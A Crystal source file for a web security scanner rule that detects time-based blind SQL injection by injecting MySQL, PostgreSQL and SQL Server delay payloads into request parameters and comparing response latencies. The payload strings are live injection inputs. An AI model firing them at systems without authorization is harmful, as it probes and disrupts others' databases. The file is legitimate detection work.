require "./types"
require "./insertion_points"

module Gori
  module Probe
    module Active
      # Time-based blind SQL injection. The last blind case `error_based_sqli` (error echo) and
      # `boolean_sqli` (a body differential) cannot reach: an injection that leaks NOTHING into the
      # response — no error, no reflection, no content change — and shows up ONLY in how long the
      # response takes. The rule injects a server-side delay (`SLEEP(n)`, `pg_sleep(n)`,
      # `WAITFOR DELAY`) and confirms it in the measured latency.
      #
      # Confirmation is deliberately NOT "one probe was slow" — a slow endpoint would false-fire on
      # that. For each param it sends TWO baselines (no delay) plus TWO increasing delays and requires
      # the latency to SCALE with the injected delay: the short leg must clear the baseline, the long
      # leg must clear it by more, and the long-minus-short increment must track the requested
      # increment (P6-respecting confirmation, per the issue). A uniformly slow endpoint answers all
      # three in roughly the same time, so the increment is ~0 and nothing fires; only a delay the
      # injection actually controls makes the two legs pull apart.
      #
      # The second baseline is the same stability guard `boolean_sqli` uses: an endpoint whose own
      # nominal latency swings by as much as the signal we look for (the two baselines disagree by
      # ≥ MIN_SHORT_DELTA) cannot support a timing oracle — its jitter alone could satisfy the three
      # thresholds by chance and raise a false Critical — so the flow DECLINES rather than measures
      # noise. The remaining reference is the SLOWER of the two baselines, so a transiently-fast
      # baseline sample cannot inflate the deltas either.
      #
      # P6: this rule DELIBERATELY waits. It never runs on the proxy data path — it rides the active
      # probe worker like every other active rule — but because each confirming leg costs real
      # wall-clock seconds, it ships DEFAULT-OFF (see `Probe::DEFAULT_DISABLED_RULES`), opt-in from
      # the Rules sub-tab or a manual per-flow scan, the same posture as `request_smuggling`. The
      # delays are kept well under the analyzer's per-probe socket timeout (ACTIVE_TIMEOUT, 10 s) so
      # a real sleep returns rather than erroring; a leg that DID error or time out is skipped, not
      # read as a signal.
      #
      # A confirmed injection reports Critical, outranking `error_based_sqli`'s High. The differential
      # reads only LATENCY, but a delay landing requires a body-bearing request, so — like the sibling
      # rules — HEAD is out and by default GET only (widened under `allow_unsafe`). Insertion points
      # come from the shared `InsertionPoints` model.
      class TimeBlindSqli < Rule
        # Probe at most this many params per flow. Kept LOWER than the sibling rules' cap because
        # every delay leg waits: at the default two families that is 2 baselines + 2 params × 2
        # families × 2 delays = 10 requests, several of them multi-second. AGGRESSIVE raises the cap
        # AND the family set (below), which the operator pays for in wall-clock knowingly.
        MAX_PROBE_PARAMS            = 2
        MAX_PROBE_PARAMS_AGGRESSIVE = 5

        # The two injected delays, in seconds. Increasing, with the 2 s gap between them the signal
        # the scaling check measures. On a typical origin (sub-second baseline) the long leg lands
        # near 4 s, well inside the analyzer's per-operation socket timeout (ACTIVE_TIMEOUT, 10 s).
        # On a genuinely slow origin (baseline > ~6 s) the long leg can exceed that timeout and come
        # back errored; the leg is then skipped, so a real injection there is MISSED, not misreported
        # — the safe direction for a Critical finding.
        DELAY_SHORT = 2
        DELAY_LONG  = 4

        MICROS_PER_SEC = 1_000_000_i64

        # Confirmation thresholds (microseconds), at half the requested delay — a real server sleep
        # overshoots (network + parse add to it, never subtract), so 50 % is a safe floor while
        # still rejecting jitter. All three must hold:
        #   * the SHORT leg clears the baseline by ≥ half DELAY_SHORT,
        #   * the LONG leg clears the baseline by ≥ half DELAY_LONG,
        #   * the LONG−SHORT increment is ≥ half the requested increment — the guard a merely-slow
        #     endpoint fails, because its legs do not pull apart as the delay grows.
        MIN_SHORT_DELTA_US = DELAY_SHORT * MICROS_PER_SEC // 2
        MIN_LONG_DELTA_US  = DELAY_LONG * MICROS_PER_SEC // 2
        MIN_INCREMENT_US   = (DELAY_LONG - DELAY_SHORT) * MICROS_PER_SEC // 2

        # A delay family, its `template` an URL-encoded (wire-ready) suffix with a `{d}` placeholder
        # for the delay in seconds. `InsertionPoints::Change#suffix` splices it onto the param's raw
        # value with no re-encode. Each ends in `-- -` to comment out any trailing quote the app
        # appends, so the injected clause terminates the statement cleanly. Numeric- and string-
        # context variants are separate families because the leading `'` that a string context needs
        # breaks a numeric one (and vice versa); a family that lands in the wrong context simply does
        # not delay and is skipped.
        record Family, label : String, template : String

        # The full ordered family set. The default posture uses the first `DEFAULT_FAMILIES` (MySQL /
        # MariaDB `SLEEP`, the most common backend); AGGRESSIVE appends PostgreSQL `pg_sleep` and
        # MS SQL Server `WAITFOR DELAY`. Ordered so the default set is a PREFIX of the full one, which
        # lets `detections_all` recover a confirming leg's family label by index without re-reading
        # the scan options.
        FAMILIES = [
          Family.new("mysql-numeric", "%20AND%20SLEEP%28{d}%29--%20-"),                                 #  AND SLEEP(d)-- -
          Family.new("mysql-string", "%27%20AND%20SLEEP%28{d}%29--%20-"),                               # ' AND SLEEP(d)-- -
          Family.new("pg-numeric", "%20AND%205%3D%28SELECT%205%20FROM%20PG_SLEEP%28{d}%29%29--%20-"),   #  AND 5=(SELECT 5 FROM PG_SLEEP(d))-- -
          Family.new("pg-string", "%27%20AND%205%3D%28SELECT%205%20FROM%20PG_SLEEP%28{d}%29%29--%20-"), # ' AND 5=(SELECT 5 FROM PG_SLEEP(d))-- -
          Family.new("mssql-numeric", "%3B%20WAITFOR%20DELAY%20%270%3A0%3A{d}%27--%20-"),               # ; WAITFOR DELAY '0:0:d'-- -
          Family.new("mssql-string", "%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A{d}%27--%20-"),             # '; WAITFOR DELAY '0:0:d'-- -
        ]
        DEFAULT_FAMILIES = 2

        def info : RuleInfo
          RuleInfo.new("sqli_time_based", "Time-based blind SQL injection",
            "Injects a server-side delay (SLEEP/pg_sleep/WAITFOR) into each parameter and confirms " \
            "it in the response latency across a baseline and two increasing delays. Ships off by " \
            "default because it deliberately waits.",
            Category::ACTIVE)
        end

        # 2 baselines + 2 delay legs per param per family. Default (two families, ≤2 params) → 6..10;
        # AGGRESSIVE sends more, but the sub-tab annotation reports the default posture like the
        # sibling rules.
        def requests_per_flow : Range(Int32, Int32)
          2 + 2 * DEFAULT_FAMILIES..(2 + 2 * DEFAULT_FAMILIES * MAX_PROBE_PARAMS)
        end

        def dedup_key(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : String?
          s, slots = injectables(detail, opts) || return nil
          InsertionPoints.dedup_key("sqli_time_based", detail, s.method, s.path, slots)
        end

        def plan(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : Plan?
          s, slots = injectables(detail, opts) || return nil
          families = families(opts)
          # results[0] and results[1] are two identical baselines (no delay) — the stability guard.
          baseline = InsertionPoints.build(detail, InsertionPoints::NO_CHANGES)
          followups = [InsertionPoints.build(detail, InsertionPoints::NO_CHANGES)]
          params = [] of Param
          slots.each do |slot|
            # Per param, a (short, long) pair per family, laid out CONTIGUOUSLY (family order = the
            # FAMILIES prefix), so detections_all reads a param's legs as a run and recovers each
            # family's label by index.
            families.each do |f|
              followups << InsertionPoints.build(detail, [{slot, InsertionPoints::Change.new(suffix: suffix(f, DELAY_SHORT))}])
              followups << InsertionPoints.build(detail, [{slot, InsertionPoints::Change.new(suffix: suffix(f, DELAY_LONG))}])
            end
            params << Param.new(slot.loc.label, slot.name, slot.raw_value)
          end
          key = InsertionPoints.dedup_key("sqli_time_based", detail, s.method, s.path, slots)
          Plan.new(baseline, params, key, followups)
        end

        # results[0], results[1] are the two baselines; a param's legs follow contiguously as
        # (short, long) pairs, one pair per family. Fire a param when ANY family's two delays scale
        # with the injection. One grouped Critical Detection per host, naming the confirming DB family.
        def detections_all(plan : Plan, results : Array(Repeater::Result), detail : Store::FlowDetail) : Array(Detection)
          t0 = stable_baseline(results) || return [] of Detection
          per = legs_per_param(plan) || return [] of Detection
          hits = [] of String
          plan.params.each_with_index do |param, i|
            if label = confirming_family(results, 2 + i * per, per, t0)
              hits << "param `#{param.name}` (#{label})"
            end
          end
          return [] of Detection if hits.empty?
          [Detection.new("sqli_time_based", Category::ACTIVE, detail.row.host, detail.row.url,
            "Time-based blind SQL injection (response delay scales with injected SLEEP)",
            Store::Severity::Critical, hits.join(", ")[0, 120], detail.row.id)]
        rescue
          [] of Detection
        end

        # The reference baseline latency (µs), or nil to DECLINE the whole flow. Both baselines
        # (results[0], results[1]) must have come back ok, and their latencies must agree within
        # MIN_SHORT_DELTA — an endpoint whose nominal latency already swings by as much as the
        # smallest delay we inject cannot support a timing oracle. The reference is the SLOWER of the
        # two, so a transiently-fast sample can't inflate the deltas the delay legs are measured by.
        private def stable_baseline(results : Array(Repeater::Result)) : Int64?
          base1 = results[0]?
          base2 = results[1]?
          return nil unless base1 && base1.ok? && base2 && base2.ok?
          d1 = base1.duration_us
          d2 = base2.duration_us
          return nil if (d1 - d2).abs >= MIN_SHORT_DELTA_US
          {d1, d2}.max
        end

        # The label of the first DB family whose (short, long) delay legs — occupying
        # `results[start, per]` as consecutive pairs — scale with the injection relative to the
        # baseline latency `t0`, or nil if none does. An errored/timed-out leg skips its family.
        private def confirming_family(results : Array(Repeater::Result), start : Int32, per : Int32,
                                      t0 : Int64) : String?
          fam = 0
          while fam * 2 < per
            short = results[start + fam * 2]?
            long = results[start + fam * 2 + 1]?
            j = fam
            fam += 1
            next unless short && long && short.ok? && long.ok?
            next unless scales?(t0, short.duration_us, long.duration_us)
            return FAMILIES[j]?.try(&.label) || "sqli"
          end
          nil
        end

        # Single-response fallback (module facade / one-shot caller): the differential needs the
        # baseline + the delay legs, so one response alone declines. The analyzer always calls
        # detections_all with the full set.
        def detections(plan : Plan, result : Repeater::Result, detail : Store::FlowDetail) : Array(Detection)
          detections_all(plan, [result], detail)
        end

        # Whether the two delayed legs scale with the injected delay relative to the baseline `t0`
        # (all durations in microseconds). The increment check is what a merely-slow endpoint fails:
        # its legs answer in the same time, so `long - short` is ~0.
        private def scales?(t0 : Int64, short : Int64, long : Int64) : Bool
          short - t0 >= MIN_SHORT_DELTA_US &&
            long - t0 >= MIN_LONG_DELTA_US &&
            long - short >= MIN_INCREMENT_US
        end

        # How many probe legs each param carries: the followups minus the second baseline, divided
        # over the params. Even (a whole number of short/long pairs) and ≥ 2, else nil to decline —
        # a malformed layout (e.g. the single-response fallback with no followups).
        private def legs_per_param(plan : Plan) : Int32?
          n = plan.params.size
          return nil if n == 0
          legs = plan.followups.size - 1 # drop the second baseline
          return nil if legs <= 0 || legs % n != 0
          per = legs // n
          (per >= 2 && per.even?) ? per : nil
        end

        # The wire-ready suffix for one family at `seconds` delay.
        private def suffix(family : Family, seconds : Int32) : String
          family.template.gsub("{d}", seconds.to_s)
        end

        # The family set for this scan: MySQL by default, all backends under AGGRESSIVE. The default
        # set is FAMILIES' prefix so detections_all's index→label recovery holds for both.
        private def families(opts : Options) : Array(Family)
          opts.aggressive ? FAMILIES : FAMILIES.first(DEFAULT_FAMILIES)
        end

        # Shared gate for plan + dedup_key so the two can't drift (equivalence-spec invariant).
        # Returns {surface, the first ≤cap injectable slots} for an eligible flow, else nil.
        private def injectables(detail : Store::FlowDetail, opts : Options) : {InsertionPoints::Surface, Array(InsertionPoints::Slot)}?
          s = InsertionPoints.enumerate(detail, opts, InsertionPoints::DEFAULT_LOCATIONS) || return nil
          return nil unless diff_method_allowed?(s.method, opts)
          cap = opts.aggressive ? MAX_PROBE_PARAMS_AGGRESSIVE : MAX_PROBE_PARAMS
          slots = s.slots.first(cap)
          return nil if slots.empty?
          {s, slots}
        end
      end
    end
  end
end
